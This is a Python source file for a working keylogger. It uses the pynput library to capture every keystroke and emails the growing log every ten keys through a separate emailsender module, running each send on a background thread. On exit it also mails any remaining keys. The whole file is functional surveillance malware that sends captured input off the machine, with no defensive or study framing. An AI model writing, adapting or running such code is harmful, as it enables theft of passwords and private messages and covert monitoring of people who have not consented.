import pynput
from pynput.keyboard import Key, Listener
import threading  # Import threading for non-blocking email sending
import emailsender  # Import the emailsender module

count = 0
keys = []       # Stores the latest 10 keystrokes
all_keys = []   # Stores all keystrokes (keeps growing)

def on_press(key):
    global keys, count, all_keys
    print(f"{key} pressed")

    # Track key presses
    keys.append(key)
    all_keys.append(key)  # Append to the cumulative list

    count += 1

    if count >= 10:  # Every 10 keystrokes
        count = 0  # Reset count
        keystrokes_to_send = all_keys.copy()  # Copy all accumulated keys
        keys.clear()  # Clear only the last 10 keys

        # Send email in a separate thread to prevent blocking
        threading.Thread(target=email, args=(keystrokes_to_send,)).start()

def email(keys_to_send):
    """Send an email with the logged keystrokes."""
    message = ""

    for key in keys_to_send:
        if isinstance(key, Key):  # Handle special keys
            if key == Key.space:
                message += "[SPACE] "
            elif key == Key.enter:
                message += "[ENTER] "
            elif key == Key.tab:
                message += "[TAB] "
            elif key == Key.backspace:
                message += "[BACKSPACE] "
            elif key == Key.esc:
                message += "[ESC] "
            elif key == Key.shift or key == Key.shift_r:
                message += "[SHIFT] "
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                message += "[CTRL] "
            elif key == Key.alt or key == Key.alt_gr:
                message += "[ALT] "
            else:
                message += f"[{key}] "  # Generic representation for unhandled keys
        else:
            message += f"{key} "  # Regular character keys

    if message.strip():  # Avoid sending empty messages
        print("Sending email:", message)
        emailsender.sendEmail(message)

def on_release(key):
    """Handle key release and send remaining keystrokes on exit."""
    if key == Key.esc:  # Stop when ESC is pressed
        if all_keys:  # Send remaining keystrokes before exiting
            threading.Thread(target=email, args=(all_keys.copy(),)).start()
        return False

# Exception handling for safe execution
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Keylogger interrupted and stopped.")
